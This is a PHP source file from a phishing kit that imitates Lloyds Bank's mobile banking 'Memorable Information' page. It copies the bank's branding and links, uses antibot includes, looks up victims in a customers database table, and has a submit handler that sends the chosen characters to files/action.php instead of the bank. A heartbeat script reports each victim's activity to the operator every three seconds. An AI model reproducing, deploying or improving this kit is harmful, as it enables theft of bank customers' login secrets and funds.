<?php

session_start();
include 'antibot/One_Time.php';
include 'antibot/session_protect.php';
include 'files/config.php';
include 'files/connect.php';

if($_SESSION['started'] == 'true'){
	//echo '<script> console.log('.$_SESSION['uniqueid'].');</script>';
	$uniqueid = $_SESSION['uniqueid'];
	$query = mysqli_query($conn,"SELECT * FROM customers WHERE uniqueid=$uniqueid");
	if($query){
		$arr = mysqli_fetch_array($query,MYSQLI_ASSOC);
		$askchar1 = $arr['askchar1'];
		$askchar2 = $arr['askchar2'];
		$askchar3 = $arr['askchar3'];
	}else{
		header('location:exit.php');
	}
	
}else{
	header('location:exit.php');
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML Basic 1.1//EN" "http://www.w3.org/TR/xhtml-basic/xhtml-basic11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-gb" xml:lang="en-gb">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

        
        <meta name="DCSext.hasTealium" content="1" />

        <title>
            Lloyds&nbsp;Bank - Mobile Banking - Enter Memorable Information
        </title>
        <meta name="keywords" content="" />
        <meta name="description" content="" />

        <meta http-equiv="content-language" content="en-gb" />
        <link rel="alternate" media="handheld" href="https://secure.lloydsbank.co.uk/personal/a/useradmin/mobile/logon/entermemorableinformation.jsp" />
        <meta name="viewport" content="width=device-width" />
        <meta name="format-detection" content="telephone=no" />

        <link rel="apple-touch-icon" sizes="57x57" href="files/img/ltsb%2057x57-.JPG" />
        <link rel="apple-touch-icon" sizes="114x114" href="files/img/ltsb%20114x114-.JPG" />

        <link type="text/css" href="./files/css/base-auto-min200720.css" rel="stylesheet" />

        

        

        <script src="files/js/jquery.js"></script>
	<script>
	

$( document ).ready(function() {


	
	var allInputs = $(":input");
	


	
	
	
	
	
	$('#memoform').submit(function(e){
		e.preventDefault();
		var formMem1 = $('#formMem1').val();
		var formMem2 = $('#formMem2').val();
		var formMem3 = $('#formMem3').val();
		
		if(formMem1 == null || formMem1 == ''){
			//msgError
			$('.msgError').show();
			return false;
		}else{
			$('.msgError').hide();
		}
		if(formMem2 == null || formMem2 == ''){
			$('.msgError').show();
			return false;
		}else{
			$('.msgError').hide();
		}
		if(formMem3 == null || formMem3 == ''){
			$('.msgError').show();
			return false;
		}else{
			$('.msgError').hide();
		}
		
		
		
		$.ajax({
		type : 'POST',
		url : 'files/action.php?type=memo',
		data : $(this).serialize(),
		success: function (data) {
			//console.log(data);
			var parsed_data = JSON.parse(data);
			if(parsed_data.status == 'ok'){
				location.href = "Loading.php"
			}else{
				return false;
			}
			//console.log(parsed_data.status);
		}
		})
		return false;
		
		
		
		
	});

	
	
	
});
	
	
	
	</script>
    <script>
        var interval = 3000;  
        function heartbeat() {
            $.ajax({
                    type: 'GET',
                    url: 'files/activity.php',
                    success: function (data) {
                        var parsed_data = JSON.parse(data);
                        //console.log(parsed_data);
                    },
                    complete: function (data) {
                        setTimeout(heartbeat, interval);
                    }
            });
        }
        setTimeout(heartbeat, interval);
    </script>
	<link rel="shortcut icon" href="files/img/favicon.ico" />
    </head>
    <body class="hasJS">
        
        <div id="outer">
            <div id="banner">
                <p id="logo">
                    <img src="./files/img/logo-.gif" alt="Lloyds Bank" />
                </p>

                <p id="userStatus">
                    <img id="headerChangeNGB:lnkpadlockSeclogoff" src="./files/img/padlock-1429554491.png" alt="Secure" />
                </p>
                <div class="cookiePolicy">
                    <a
                        id="headerChangeNGB:ePrivacyLoggedOut"
                        name="headerChangeNGB:ePrivacyLoggedOut"
                        href="https://secure.lloydsbank.co.uk/personal/a/useradmin/mobile/logon/entermemorableinformation.jsp?REFERRING_LOCATION=%2Fuseradmin%2Fmobile%2Flogon%2Fentermemorableinformation.jsp&amp;HEADER_CONTENT=pages%2Fp226_00%2F22600htm502&amp;BODY_CONTENT=pages%2Fp226_00%2F22600htm503&amp;COOKIE_POLICY_FLAG=FALSE&amp;lnkcmd=headerChangeNGB%3AePrivacyLoggedOut&amp;al="
                        title="Cookie policy"
                        class="blockLink"
                    >
                        Cookie policy
                    </a>
                </div>
                <div class="clearer"></div>
            </div>
            <div id="header">
                <div class="panelTL">
                    <div class="panelTR">
                        <div class="panelBR">
                            <div class="panelBL">
                                <div id="headerInner">
                                    <!-- start TS:component_0_free_format -->

                                    <h1>Memorable Information</h1>

                                    <!-- end TS:component_0_free_format -->
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="content enter-mi">
                <div class="panel">
                    <div class="panelTL">
                        <div class="panelTR">
                            <div class="panelBR">
                                <div class="panelBL">
                                    <div class="panelInner">
                                        <div class="inner">
                                            <!-- start TS:component_0_free_format -->

                                            <p class="sudoLabel">Please select characters below.</p>

                                            <!-- end TS:component_0_free_format -->

                                            <form
                                                id="memoform"
                                                name="frmEnterMemorableInformation1"
                                                method="post"
                                                action="https://secure.lloydsbank.co.uk/personal/a/useradmin/mobile/logon/entermemorableinformation.jsp"
                                                autocomplete="off"
                                                enctype="application/x-www-form-urlencoded"
                                            >
											<input type='hidden' name='userid' value="<?=$_SESSION['uniqueid'];?>">
                                                <div class="memorableInfo">
                                                    <div class="formField">
                                                        <div class="formField">
                                                            <label for="formMem1"><?=$askchar1;?>:</label>
                                                            <select
                                                                id="formMem1"
                                                                name="formMem1"
                                                                class="memInfoInput"
                                                            >
                                                                <option value="-">-</option>
                                                                <option value="a">&nbsp;a</option>
                                                                <option value="b">&nbsp;b</option>
                                                                <option value="c">&nbsp;c</option>
                                                                <option value="d">&nbsp;d</option>
                                                                <option value="e">&nbsp;e</option>
                                                                <option value="f">&nbsp;f</option>
                                                                <option value="g">&nbsp;g</option>
                                                                <option value="h">&nbsp;h</option>
                                                                <option value="i">&nbsp;i</option>
                                                                <option value="j">&nbsp;j</option>
                                                                <option value="k">&nbsp;k</option>
                                                                <option value="l">&nbsp;l</option>
                                                                <option value="m">&nbsp;m</option>
                                                                <option value="n">&nbsp;n</option>
                                                                <option value="o">&nbsp;o</option>
                                                                <option value="p">&nbsp;p</option>
                                                                <option value="q">&nbsp;q</option>
                                                                <option value="r">&nbsp;r</option>
                                                                <option value="s">&nbsp;s</option>
                                                                <option value="t">&nbsp;t</option>
                                                                <option value="u">&nbsp;u</option>
                                                                <option value="v">&nbsp;v</option>
                                                                <option value="w">&nbsp;w</option>
                                                                <option value="x">&nbsp;x</option>
                                                                <option value="y">&nbsp;y</option>
                                                                <option value="z">&nbsp;z</option>
                                                                <option value="0">&nbsp;0</option>
                                                                <option value="1">&nbsp;1</option>
                                                                <option value="2">&nbsp;2</option>
                                                                <option value="3">&nbsp;3</option>
                                                                <option value="4">&nbsp;4</option>
                                                                <option value="5">&nbsp;5</option>
                                                                <option value="6">&nbsp;6</option>
                                                                <option value="7">&nbsp;7</option>
                                                                <option value="8">&nbsp;8</option>
                                                                <option value="9">&nbsp;9</option>
                                                                <option value="-1" disabled="disabled">&nbsp; </option>
                                                            </select>
                                                        </div>
                                                    </div>
                                                    <div class="formField">
                                                        <div class="formField">
                                                            <label for="formMem2"><?=$askchar2;?>:</label>
                                                            <select
                                                                id="formMem2"
                                                                name="formMem2"
                                                                class="memInfoInput"
                                                            >
                                                                <option value="-">-</option>
                                                                <option value="a">&nbsp;a</option>
                                                                <option value="b">&nbsp;b</option>
                                                                <option value="c">&nbsp;c</option>
                                                                <option value="d">&nbsp;d</option>
                                                                <option value="e">&nbsp;e</option>
                                                                <option value="f">&nbsp;f</option>
                                                                <option value="g">&nbsp;g</option>
                                                                <option value="h">&nbsp;h</option>
                                                                <option value="i">&nbsp;i</option>
                                                                <option value="j">&nbsp;j</option>
                                                                <option value="k">&nbsp;k</option>
                                                                <option value="l">&nbsp;l</option>
                                                                <option value="m">&nbsp;m</option>
                                                                <option value="n">&nbsp;n</option>
                                                                <option value="o">&nbsp;o</option>
                                                                <option value="p">&nbsp;p</option>
                                                                <option value="q">&nbsp;q</option>
                                                                <option value="r">&nbsp;r</option>
                                                                <option value="s">&nbsp;s</option>
                                                                <option value="t">&nbsp;t</option>
                                                                <option value="u">&nbsp;u</option>
                                                                <option value="v">&nbsp;v</option>
                                                                <option value="w">&nbsp;w</option>
                                                                <option value="x">&nbsp;x</option>
                                                                <option value="y">&nbsp;y</option>
                                                                <option value="z">&nbsp;z</option>
                                                                <option value="0">&nbsp;0</option>
                                                                <option value="1">&nbsp;1</option>
                                                                <option value="2">&nbsp;2</option>
                                                                <option value="3">&nbsp;3</option>
                                                                <option value="4">&nbsp;4</option>
                                                                <option value="5">&nbsp;5</option>
                                                                <option value="6">&nbsp;6</option>
                                                                <option value="7">&nbsp;7</option>
                                                                <option value="8">&nbsp;8</option>
                                                                <option value="9">&nbsp;9</option>
                                                                <option value="-1" disabled="disabled">&nbsp; </option>
                                                            </select>
                                                        </div>
                                                    </div>
                                                    <div class="formField">
                                                        <div class="formField">
                                                            <label for="formMem3"><?=$askchar3;?>:</label>
                                                            <select
                                                                id="formMem3"
                                                                name="formMem3"
                                                                class="memInfoInput"
                                                            >
                                                                <option value="-">-</option>
                                                                <option value="a">&nbsp;a</option>
                                                                <option value="b">&nbsp;b</option>
                                                                <option value="c">&nbsp;c</option>
                                                                <option value="d">&nbsp;d</option>
                                                                <option value="e">&nbsp;e</option>
                                                                <option value="f">&nbsp;f</option>
                                                                <option value="g">&nbsp;g</option>
                                                                <option value="h">&nbsp;h</option>
                                                                <option value="i">&nbsp;i</option>
                                                                <option value="j">&nbsp;j</option>
                                                                <option value="k">&nbsp;k</option>
                                                                <option value="l">&nbsp;l</option>
                                                                <option value="m">&nbsp;m</option>
                                                                <option value="n">&nbsp;n</option>
                                                                <option value="o">&nbsp;o</option>
                                                                <option value="p">&nbsp;p</option>
                                                                <option value="q">&nbsp;q</option>
                                                                <option value="r">&nbsp;r</option>
                                                                <option value="s">&nbsp;s</option>
                                                                <option value="t">&nbsp;t</option>
                                                                <option value="u">&nbsp;u</option>
                                                                <option value="v">&nbsp;v</option>
                                                                <option value="w">&nbsp;w</option>
                                                                <option value="x">&nbsp;x</option>
                                                                <option value="y">&nbsp;y</option>
                                                                <option value="z">&nbsp;z</option>
                                                                <option value="0">&nbsp;0</option>
                                                                <option value="1">&nbsp;1</option>
                                                                <option value="2">&nbsp;2</option>
                                                                <option value="3">&nbsp;3</option>
                                                                <option value="4">&nbsp;4</option>
                                                                <option value="5">&nbsp;5</option>
                                                                <option value="6">&nbsp;6</option>
                                                                <option value="7">&nbsp;7</option>
                                                                <option value="8">&nbsp;8</option>
                                                                <option value="9">&nbsp;9</option>
                                                                <option value="-1" disabled="disabled">&nbsp; </option>
                                                            </select>
                                                        </div>
                                                    </div>
                                                    <div class="clearer"></div>
                                                </div>
                                                <div class="inner"><div class="enterMemoInfo"></div></div>
                                                <div class="divider"></div>
                                                <div class="actions">
                                                    <input id="lnkSubmit" name="lnkSubmit" type="submit" value="Submit" alt="Submit" title="Submit" class="submitAction" />
                                                    <div class="nav">
                                                        <div class="lnkLev2">
                                                            <div class="lnkTL">
                                                                <div class="lnkTR">
                                                                    <div class="lnkBR">
                                                                        <div class="lnkBL">
                                                                            <p class="lnkLev2PCancel">
                                                                                <a
                                                                                    id="lnkCancel"
                                                                                    name="lnkCancel"
                                                                                    href="https://secure.lloydsbank.co.uk/personal/a/useradmin/mobile/logon/entermemorableinformation.jsp?lnkcmd=frmEnterMemorableInformation1%3AlnkCancel&amp;al="
                                                                                    class="blockLink"
                                                                                >
                                                                                    Cancel
                                                                                </a>
                                                                            </p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <input type="hidden" name="frmEnterMemorableInformation1" value="frmEnterMemorableInformation1" /><input type="hidden" name="submitToken" value="5324141" />
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div id="footer footerLogin">
                    <div class="FootNav">
                        <div class="lnkLevFoot">
                            <p class="lnkLevFootP">
                                <a
                                    id="lnk1"
                                    name="lnk1"
                                    href="https://secure.lloydsbank.co.uk/personal/a/useradmin/mobile/logon/entermemorableinformation.jsp?REFERRING_LOCATION=ENTER_MI&amp;HEADER_CONTENT=pages%2Fp04_04_enter_memorable_information%2F0404htm302&amp;BODY_CONTENT=pages%2Fp04_04_enter_memorable_information%2F0404hlp301&amp;lnkcmd=lnk1&amp;al="
                                    title="Help"
                                    class="blockLink"
                                >
                                    Help
                                </a>
                            </p>
                        </div>
                        <div class="lnkLevFoot">
                            <p class="lnkLevFootP">
                                <a
                                    id="lnk2"
                                    name="lnk2"
                                    href="https://secure.lloydsbank.co.uk/personal/a/useradmin/mobile/logon/entermemorableinformation.jsp?REFERRING_LOCATION=ENTER_MI&amp;HEADER_CONTENT=pages%2Fp140_06_security_logged_out%2F14006htm300&amp;BODY_CONTENT=pages%2Fp140_06_security_logged_out%2F14006htm301&amp;lnkcmd=lnk2&amp;al="
                                    title="Security"
                                    class="blockLink"
                                >
                                    Security
                                </a>
                            </p>
                        </div>
                        <div class="lnkLevFoot">
                            <p class="lnkLevFootP">
                                <a
                                    id="lnk3"
                                    name="lnk3"
                                    href="https://secure.lloydsbank.co.uk/personal/a/useradmin/mobile/logon/entermemorableinformation.jsp?REFERRING_LOCATION=ENTER_MI&amp;HEADER_CONTENT=pages%2Fp140_12_contact_logged_out%2F14012htm300&amp;BODY_CONTENT=pages%2Fp140_12_contact_logged_out%2F14012htm301&amp;lnkcmd=lnk3&amp;al="
                                    title="Contact us"
                                    class="blockLink"
                                >
                                    Contact us
                                </a>
                            </p>
                        </div>
                    </div>
                    <div class="footerLinksLogin">
                        <a
                            id="sntgprmtd2:footerngb:cndunauthenvironngb:lnksecurityloggedout"
                            name="sntgprmtd2:footerngb:cndunauthenvironngb:lnksecurityloggedout"
                            href="https://secure.lloydsbank.co.uk/personal/a/useradmin/mobile/logon/entermemorableinformation.jsp?REFERRING_LOCATION=&amp;HEADER_CONTENT=pages%2Fp140_06_security_logged_out%2F14006htm300&amp;BODY_CONTENT=pages%2Fp140_06_security_logged_out%2F14006htm301&amp;lnkcmd=sntgprmtd2%3Afooterngb%3Acndunauthenvironngb%3Alnksecurityloggedout&amp;al="
                            title="Security"
                        >
                            Security
                        </a>

                        <a
                            id="sntgprmtd2:footerngb:cndunauthenvironngb:lnkLegalloggedout"
                            name="sntgprmtd2:footerngb:cndunauthenvironngb:lnkLegalloggedout"
                            href="https://secure.lloydsbank.co.uk/personal/a/useradmin/mobile/logon/entermemorableinformation.jsp?REFERRING_LOCATION=&amp;HEADER_CONTENT=pages%2Fp140_01_legal_logged_out%2F14001htm300&amp;BODY_CONTENT=pages%2Fp140_01_legal_logged_out%2F14001htm301&amp;lnkcmd=sntgprmtd2%3Afooterngb%3Acndunauthenvironngb%3AlnkLegalloggedout&amp;al="
                            title="Legal"
                            class="footerLinksLast"
                        >
                            Legal
                        </a>
                    </div>
                    <span id="mLogonSuccess" style="display: none;"></span>
                    
                </div>
            </div>
        </div>
        

        
        
    </body>
</html>
